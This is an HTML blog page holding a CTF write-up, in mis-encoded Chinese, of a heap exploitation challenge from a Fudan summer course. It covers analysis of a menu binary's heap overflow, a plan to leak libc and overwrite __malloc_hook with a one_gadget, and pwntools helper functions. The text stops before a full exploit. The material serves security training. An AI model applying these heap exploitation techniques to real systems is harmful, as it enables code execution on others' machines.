<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="HaveYouTall">



    <meta name="description" content="Binary | Blockchain | Crypto">


    <meta name="keywords" content="Binary | Blockchain | Crypto">


<title>å¤æ—¦ç™½æ³½æš‘æœŸè¯¾ç¨‹ heap é¢˜ ç¬¬ä¸€é¢˜ | HaveYouTall</title>



    <link rel="icon" href="/favicon.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "Â· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "Â· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">HaveYouTall&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag/">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">HaveYouTall&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag/">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6;    // ä¸º 6 æ—¶å±•å¼€æ‰€æœ‰
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function () {
            tocbot.refresh(obj_merge(tocbot_default_config, { hasInnerContainers: true }));
        }, 420); // è¿™ä¸ªå€¼æ˜¯ç”± tocbot æºç é‡Œå®šä¹‰çš„ scrollSmoothDuration å¾—æ¥çš„
    }

    document.ready(function () {
        tocbot.init(obj_merge(tocbot_default_config, { collapseDepth: 1 }));
    });

    function expandToc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, { collapseDepth: expanded ? 1 : DEPTH_MAX }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">å¤æ—¦ç™½æ³½æš‘æœŸè¯¾ç¨‹ heap é¢˜ ç¬¬ä¸€é¢˜</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">HaveYouTall</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">August 11, 2021&nbsp;&nbsp;22:17:52</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/ctf/">ctf</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="å‰æƒ…åˆ†æ"><a href="#å‰æƒ…åˆ†æ" class="headerlink" title="å‰æƒ…åˆ†æ"></a>å‰æƒ…åˆ†æ</h2><p>æ‹¿åˆ°è¿™ä¸ªé¢˜ï¼Œæ˜¾ç„¶æ˜¯ä¸ªæ ‡å‡†çš„èœå•é¢˜ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦çœ‹çœ‹å„ä¸ªåŠŸèƒ½é‡Œé¢ï¼Œå…·ä½“çš„æ“ä½œæ˜¯ä»€ä¹ˆæ ·çš„ã€‚</p>
<span id="more"></span>

<p>idaé‡Œæ‰“å¼€çœ‹åˆ°</p>
<ul>
<li><p><code>show_item</code> å‡½æ•°å¯ä»¥è¾“å‡ºä¸€ä¸ªå †å—ä¸­çš„å†…å®¹</p>
<p><img src="/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/image-20210811170723032.png" alt="image-20210811170723032"></p>
</li>
<li><p><code>add_item</code> å¯ä»¥æ–°åˆ†é…ä¸€ä¸ªå †å—</p>
<p><img src="/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/image-20210811170702447.png" alt="image-20210811170702447"></p>
</li>
<li><p><code>change_item</code> å¯ä»¥ä¿®æ”¹ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å †å—é‡Œé¢çš„å†…å®¹ï¼Œè¿™é‡Œæ²¡æœ‰é™åˆ¶å¯ä»¥ä¿®æ”¹å¤šå°‘ï¼Œå› æ­¤æœ‰ä¸€ä¸ªä»»æ„å­—èŠ‚å †æº¢å‡ºçš„æ¼æ´ã€‚</p>
<p><img src="/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/image-20210811170738810.png" alt="image-20210811170738810"></p>
</li>
<li><p><code>remove_item</code> å¯ä»¥åˆ é™¤ä¸€ä¸ªå †å— </p>
<p><img src="/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/image-20210811170756963.png" alt="image-20210811170756963"></p>
</li>
</ul>
<p>é™¤äº†æ¯ä¸ªå‡½æ•°çš„åŠŸèƒ½ä¹‹å¤–ï¼Œè¿™ä¸ªé¢˜ç›®æœ‰å¦å¤–éœ€è¦æ³¨æ„çš„å‡ ç‚¹ï¼š</p>
<ul>
<li><p>é¦–å…ˆï¼Œåœ¨ç»™å †å—è¯»å…¥æ•°æ®çš„æ—¶å€™ï¼Œè¯»å®Œä¹‹åä¼šè‡ªåŠ¨ç»™ä¸‹ä¸€ä¸ªåœ°å€å¢åŠ ä¸€ä¸ª0ï¼Œä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºaddåŠŸèƒ½ä¸­æ‰€ç¤ºã€‚</p>
<p><img src="/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/image-20210811170534500.png" alt="image-20210811170534500"></p>
</li>
<li><p>ç„¶åæ˜¯ï¼Œåœ¨removeåŠŸèƒ½ä¸­ï¼Œå…¶ç»™freeä¹‹åçš„æŒ‡é’ˆç½®0ï¼Œé¿å…äº†ç›´æ¥çš„UAF</p>
</li>
<li><p>æœ€åæ˜¯éœ€è¦æ³¨æ„åˆ†æå¯¸å †å—çš„ç»“æ„é•¿ä»€ä¹ˆæ ·ï¼ˆå³<code>itemlist</code>å’Œ<code>qword_2020A8</code>åˆ°åº•æ˜¯ä»€ä¹ˆï¼‰ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬çœ‹çœ‹addåŠŸèƒ½é‡Œé¢ï¼Œv2æ˜¾ç„¶ä»£è¡¨äº†éœ€è¦åˆ†é…çš„å †ç©ºé—´å¤§å°ï¼Œé‚£<code>itemlist</code>çš„ä½4å­—èŠ‚æ˜¾ç„¶å°±æ˜¯å­˜è¿™ä¸ªå †å—çš„å¤§å°äº†ã€‚ç„¶å<code>qword_2020A8</code>æ˜¾ç„¶æ˜¯mallocä¹‹åçš„æŒ‡é’ˆåˆ—è¡¨ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å†æ¥çœ‹çœ‹ï¼Œå†bssæ®µé‡Œé¢è¿™ä¸¤ä¸ªä¸œè¥¿çš„åˆ†å¸ƒæƒ…å†µã€‚</p>
<p><img src="/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/image-20210811171355883.png" alt="image-20210811171355883"></p>
<p>ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ<code>itemlist</code> åé¢8ä¸ªå­—èŠ‚å°±æ˜¯<code>qword_2020A8</code>ã€‚é‚£ä¹ˆæˆ‘ä»¬å†çœ‹æ¯æ¬¡åˆ†é…çš„æ—¶å€™ï¼Œ<code>itemlist</code>å’Œ<code>qword_2020A8</code>çš„æŒ‡é’ˆå¢é•¿è¶‹åŠ¿å¯ä»¥çœ‹åˆ°ï¼Œ<code>itemlist</code>æ¯æ¬¡å¢é•¿4ä¸ª4å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯2ä¸ª8å­—èŠ‚ï¼Œé‚£ä¹ˆåˆšå¥½å°±è·³åˆ°äº†<code>qword_2020A8</code> ä¹‹å8ä¸ªå­—èŠ‚çš„åœ°æ–¹ï¼Œä»å›¾ä¸Šçœ‹å°±æ˜¯2020E0çš„åœ°æ–¹ã€‚æ­¤æ—¶æˆ‘ä»¬æš‚æ—¶æŠŠè¿™ä¸ªåœ°æ–¹æ ‡è®°ä¸º<code>itemlist1</code></p>
<p>ç„¶åå†çœ‹<code>qword_2020A8</code>çš„å¢é•¿ï¼Œä»¥æ­¤æ˜¯é•¿2ä¸ª8å­—èŠ‚ï¼Œè·Ÿ<code>itemlist</code>æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å®ƒç›¸å½“äºè·³åˆ°äº†<code>itemlist1</code>ä¹‹å8ä¸ªå­—èŠ‚å¤„ï¼Œä¹Ÿå°±æ˜¯2020E8çš„åœ°æ–¹ï¼Œæ­£å¥½ä¸ä¼šä¸<code>itemlist1</code>æ‰€ç”¨çš„8å­—èŠ‚ç©ºé—´é‡åˆã€‚</p>
<p>å› æ­¤åˆ†æåˆ°è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥å¾ˆæ˜æ˜¾çŸ¥é“äº†ï¼Œ<code>itemlist</code>å’Œ<code>qword_2020A8</code>çš„ä½œç”¨ï¼Œä¸€ä¸ªæ˜¯å­˜å †å—åˆ†é…çš„ç©ºé—´ï¼Œä¸€ä¸ªæ˜¯å­˜å †å—åˆ†é…çš„æŒ‡é’ˆã€‚ç›¸å½“äºè¿™ä¸¤ä¸ªæ˜¯ä¸€ä¸ªç»“æ„ä½“ä¸­çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> size; <span class="comment">//å¯¹åº”äº8å­—èŠ‚çš„itemlistï¼Œè™½ç„¶åªç”¨äº†4å­—èŠ‚å­˜æ•°å­—ï¼Œä½†æ˜¯æŒ‰ç…§å¢é•¿æ–¹å¼æ¥çœ‹ï¼Œå°±æ˜¯8ä¸ªå­—èŠ‚ã€‚</span></span><br><span class="line">	<span class="keyword">char</span> *content; <span class="comment">//ä¸€ä¸ª8å­—èŠ‚çš„æŒ‡é’ˆï¼ŒæŒ‡å‘çš„æ˜¯mallocå‡ºæ¥çš„å †å—ï¼Œå †å—é‡Œå­˜çš„æ˜¯contentçš„å†…å®¹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>ç»ˆäºè‡³æ­¤ï¼Œæˆ‘ä»¬åˆ†æå®Œäº†è¿™ä¸ªé¢˜ç›®ç¨‹åºçš„åŸºæœ¬æ¶æ„ã€‚</p>
<p><strong>å®‰å…¨æ£€æŸ¥</strong></p>
<p>ä¸‹é¢æˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªæ–‡ä»¶éƒ½å¼€äº†å“ªäº›ä¿æŠ¤æªæ–½</p>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªé¢˜çš„é™åˆ¶ä¸‹ï¼Œé¦–å…ˆå¦‚æœå¯ä»¥å¼„åˆ°gotè¡¨åœ°å€ï¼Œé‚£æ˜¯å¯ä»¥å†™çš„ã€‚</p>
<p>ä¸èƒ½ç›´æ¥unlinkï¼Œå› ä¸ºå¼€äº†PIEï¼Œé™¤éèƒ½å¤Ÿæåˆ°å †çš„åŸºå€ã€‚</p>
<h2 id="å¼€æ"><a href="#å¼€æ" class="headerlink" title="å¼€æ"></a>å¼€æ</h2><p>æœ‰äº†ä¸Šé¢çš„åˆ†æä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ€è€ƒæ€ä¹ˆæ¥åšè¿™ä¸ªé¢˜äº†ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¿™é‡ŒåŸºæœ¬ä¸Šå¯ä»¥è€ƒè™‘æ˜¯æ‰¾ä¸ªlibcçš„one_gadgetæ¥åš</p>
<blockquote>
<p>å› ä¸ºæˆ‘åˆšå…¥é—¨ï¼Œåªèƒ½æƒ³åˆ°è¿™ä¸ªåšæ³•ï¼Œä¸ç„¶å†è¿™ä¹ˆå¤šä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œåœ¨å¥½åƒè¿˜æ²¡æ³•å¼„åˆ°æ ˆé‡Œçš„å‰æä¸‹ï¼Œå¥½åƒä¸çŸ¥é“æ€ä¹ˆå¼„ROPgadgetæ¥åšã€‚</p>
</blockquote>
<p><strong>å †åšæ³•çš„åˆç†æ€§çš„æ€è€ƒå¤§è‡´å¦‚ä¸‹</strong></p>
<p>1ã€é¦–å…ˆæˆ‘ä»¬æ˜ç¡®äº†éœ€è¦libcçš„one_gadgetï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦leak libcçš„åŸºå€ï¼Œè¿™ä¸ªå¯ä»¥åˆ©ç”¨unsorted biné‡Œé¢çš„fdå’ŒbkæŒ‡é’ˆæå®šï¼Œå› ä¸ºå½“åªæœ‰ä¸€ä¸ªå †å—åœ¨unsorted binä¸­çš„æ—¶å€™ï¼Œè¿™ä¸ªfdå’Œbkæ˜¯æŒ‡å‘bin[0]çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯main arena + 88ã€‚å› æ­¤è¿™ä¸ªleakæ€è·¯æš‚æ—¶å¯è¡Œçš„ã€‚</p>
<blockquote>
<p>bin[0]å°±æ˜¯unsorted binã€‚</p>
</blockquote>
<p>2ã€æœ‰äº†one_gadgetçš„åŸºå€ä¹‹åï¼Œå°±æ˜¯æ€ä¹ˆæ‰èƒ½æ”¹å˜æ§åˆ¶æµã€‚æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªå«åš<code>__malloc_hook</code>çš„å‡½æ•°ï¼Œå®ƒçš„è°ƒç”¨æ¡ä»¶æ˜¯åœ¨mallocè°ƒç”¨çš„æ—¶å€™çœ‹çœ‹<code>__malloc_hook</code>ä¸­æœ‰æ²¡æœ‰å‡½æ•°çš„åœ°å€ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘æŠŠlibcçš„one_gadgetåœ°å€å†™åˆ°è¿™é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨mallocçš„æ—¶å€™å¼€shelläº†ã€‚</p>
<p>3ã€å¦‚ä½•æ”¹å†™<code>__malloc_hook</code>å°±æ¯”è¾ƒé‡è¦äº†ã€‚ç›®å‰èƒ½æƒ³åˆ°çš„å°±æ˜¯unlinkï¼Œä½†æ˜¯è¿™ä¸ªåŠæ³•æˆ‘æµ‹äº†ä¸€ä¸‹æœ‰ç‚¹é—®é¢˜ï¼Œæš‚æ—¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ˆå¯èƒ½æ˜¯libc2.23é‡Œé¢ä¹Ÿä¼šæ£€æŸ¥çœ‹fdå‡ºå»å†bkå›æ¥æ˜¯ä¸æ˜¯è‡ªå·±ä¹ˆï¼Ÿï¼‰ã€‚ç„¶åæˆ‘æ‰¾äº†å¾ˆå¤šèµ„æ–™ï¼Œå‘ç°å…¶å®å¯ä»¥åˆ©ç”¨fast binçš„fdæŒ‡é’ˆï¼Œè®©å®ƒæŒ‡å‘<code>__malloc_hook</code>ï¼Œç„¶ååœ¨åˆ†é…ä¸€ä¸ªfast binå¯¹åº”å¤§å°å †å—çš„æ—¶å€™ï¼Œå¯ä»¥æŠŠ<code>__malloc_hook</code>æ‰€åœ¨çš„åœ°å€å½“æˆä¸€ä¸ªå †å—åˆ†é…å‡ºæ¥ï¼Œç„¶åå°±å¯ä»¥åœ¨é‡Œé¢ä¿®æ”¹å¯¹åº”çš„ä¿¡æ¯äº†</p>
<h2 id="çœŸå®å¤„ç†çš„æ€è·¯-exp"><a href="#çœŸå®å¤„ç†çš„æ€è·¯-exp" class="headerlink" title="çœŸå®å¤„ç†çš„æ€è·¯ - exp"></a>çœŸå®å¤„ç†çš„æ€è·¯ - exp</h2><p>æœ‰äº†ä¸Šé¢çš„åˆ†æä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æŒ‰ç…§è¿™ä¸ªæµç¨‹å†™expäº†</p>
<p>expçš„å…·ä½“æ€è·¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>å…ˆå¯¹ç¨‹åºå„ä¸ªåŠŸèƒ½å»ºæ¨¡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#r = remote(&#x27;106.14.112.162&#x27;,&#x27;10013&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#e = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment">#r.recvuntil()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    r.send(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,length,name</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(index))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(length))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">	r.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">index</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç„¶åæˆ‘ä»¬è¦leak libcã€‚è¿™ä¸ªæ­¥éª¤æ²¡æœ‰æƒ³è±¡ä¸­ç®€å•ã€‚</p>
<p><strong>é”™è¯¯ç¤ºèŒƒ</strong>ï¼šæœ¬æ¥æƒ³å…ˆfreeæ‰ä¸€ä¸ªå¤§äº0x80ï¼ˆåŠ ä¸Šmeradataåçš„å †å¤§å°ï¼‰çš„å †å—ï¼Œè®©å…¶è¿›å…¥unsorted binï¼Œç„¶åå†mallocå‡ºæ¥ï¼Œå¹¶ç»™contentå†…å®¹ä¸ºâ€â€ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œè¿™æ ·show()å‡ºæ¥å°±èƒ½å¾—åˆ°å…¶å†…å®¹ï¼Œç„¶è€Œè¿™ä¸ªæ˜¯ä¸è¡Œçš„ã€‚æˆ‘ä»¥ä¸ºæ˜¯â€œâ€ç©ºå­—ç¬¦ä¸²çš„é—®é¢˜ï¼Œä¼šå¼•å…¥\x00ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠå‰8ä¸ªå­—èŠ‚ï¼ˆfdï¼‰å†™æˆ8Bçš„å­—ç¬¦aï¼Œç„¶åä¸€è¿ä¸²è¾“å‡ºåˆ°å8å­—èŠ‚ï¼ˆbkï¼‰ï¼Œç»“æœå±…ç„¶åé¢8ä¸ªå­—èŠ‚çš„æœ€ä½1ä¸ªå­—èŠ‚ä¹Ÿè¢«å†™æˆ\x00äº†ã€‚äºæ˜¯æˆ‘å»æ‰¾é—®é¢˜ï¼Œåœ¨idaé‡Œé¢å°±çœ‹åˆ°äº†ï¼Œè¯»å…¥ä¹‹åï¼Œä¼šå°†è¯»å…¥åçš„æœ«å°¾åŠ ä¸Šä¸€ä¸ª0ï¼ˆåœ¨å‰æƒ…åˆ†æé‡Œæåˆ°è¿‡äº†ï¼‰ã€‚å¯è§è¿™ä¸ªç¨‹åºå°±æ˜¯é˜²æ­¢ä½ å»è¿™ä¹ˆleakï¼ŒğŸ‚ã€‚</p>
<p><strong>æ­£ç¡®æ€è·¯</strong>ï¼šè¿™æ ·çš„è¯æˆ‘ä»¬å°±è¦æƒ³ä¸ªåˆ«çš„åŠæ³•æ¥leakäº†ã€‚æ‰¾äº†å¾ˆå¤šèµ„æ–™ä¹‹åï¼Œæˆ‘å¼„æ˜ç™½äº†ã€‚è¿™ä¸ªæ€è·¯å¾ˆå·§å¦™ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆåˆ†é…ä¸€ä¸ªå°å †å—ï¼ˆåŠ ä¸Šmetadataå°±0x20å°±å¤Ÿï¼‰ï¼Œç„¶åå†åˆ†é…ä¸¤ä¸ªå †å—ï¼ˆè¦æ±‚è¿™ä¸¤ä¸ªå †å—åŠ èµ·æ¥å¤§å°ï¼ˆåŒ…æ‹¬ä»–ä»¬çš„metadataï¼‰å¤§äº0x80å°±å¥½ï¼‰ã€‚</p>
<p>ç„¶åæˆ‘ä»¬ä¿®æ”¹ç¬¬ä¸€ä¸ªå°å †å—ï¼Œç›®çš„æ˜¯è®©å®ƒæŠŠç¬¬äºŒä¸ªå †å—çš„å¤´ä¿®æ”¹æ‰ã€‚</p>
<blockquote>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªå°å †å—æˆ‘è¯´0x20å°±è¡Œï¼Œå› ä¸ºå¼€å¤§äº†æ²¡æœ‰å¿…è¦</p>
</blockquote>
<p>æˆ‘ä»¬éœ€è¦æŠŠç¬¬äºŒä¸ªå †å—çš„å¤´æ”¹æˆ 00 å’Œ 0xnnï¼Œè¿™é‡Œnnæ˜¯ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå †å—åˆèµ·æ¥çš„å¤§å°ï¼ˆåŒ…æ‹¬metadataï¼‰ï¼Œè¿™æ ·æ˜¯ä¸ºäº†ä¼ªé€ äºŒä¸‰ä¸ªå †å—ä¸ºä¸€ä¸ªå †å—ã€‚</p>
<p>ç„¶åå†æŠŠç¬¬äºŒä¸ªå †å—freeæ‰ï¼Œè¿™æ ·ä¼ªé€ çš„è¿™ä¸ªäºŒä¸‰åˆä½“å †å°±ä¼šè¢«æ”¾åˆ°unsorted biné‡Œï¼ˆæ‰€ä»¥ä¹‹å‰è¯´è¿™ä¸¤ä¸ªåˆèµ·æ¥å¤§å°è¦å¤§äº0x80ï¼‰ã€‚</p>
<p>è€Œä¸”æ­¤æ—¶ï¼Œç¬¬ä¸‰ä¸ªå †å—çš„æŒ‡é’ˆè¿˜åœ¨ï¼Œä¹Ÿå°±æ˜¯unsorted binçš„ååŠæ®µå…¶å®æ˜¯ä»å¤–é¢å¯ä»¥è®¿é—®äº†ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªè·Ÿæœ€å¼€å§‹ç¬¬äºŒä¸ªå †å—ä¸€æ ·å¤§çš„å †å—ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šä»unsorted biné‡Œé¢åˆ†å‰²å‡ºä¸€éƒ¨åˆ†åˆ†é…ï¼Œè¿™å°±ä½¿å¾—å‰©ä¸‹çš„éƒ¨åˆ†åˆšå¥½å°±æ˜¯åŸæ¥çš„ç¬¬ä¸‰ä¸ªå †å—æ‰€æŒ‡çš„ä½ç½®ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶å€™ï¼Œå®ƒçš„fdå’Œbkéƒ½æ˜¯main arena + 88ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬ä¸éœ€è¦å†™å…¥æ•°æ®ï¼Œå°±æœ‰äº†æƒ³è¦çš„åœ°å€ï¼Œå¹¶ä¸”ä¸ç”¨å†åˆ†é…äº†ï¼Œå› ä¸ºæŒ‡é’ˆä¸€ç›´éƒ½åœ¨ï¼Œæ²¡æœ‰freeè¿‡ã€‚</p>
